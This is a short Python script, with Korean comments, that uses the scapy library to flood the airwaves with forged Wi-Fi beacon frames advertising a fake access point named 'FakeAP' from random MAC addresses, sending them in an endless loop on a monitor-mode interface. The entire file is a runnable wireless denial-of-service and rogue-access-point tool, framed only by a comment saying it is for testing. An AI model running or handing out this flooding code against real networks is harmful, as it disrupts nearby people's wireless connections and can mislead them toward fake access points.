from scapy.all import *

def flood_beacon(ssid):
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC())
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/Dot11Beacon()/essid
    sendp(frame, inter=0.1, loop=1, iface='wlan0mon')  # wlan0mon은 무선 인터페이스 이름에 맞게 변경해야 합니다.

# 테스트를 위해 Beacon Flooding을 시작합니다.
ssid = 'FakeAP'
flood_beacon(ssid)
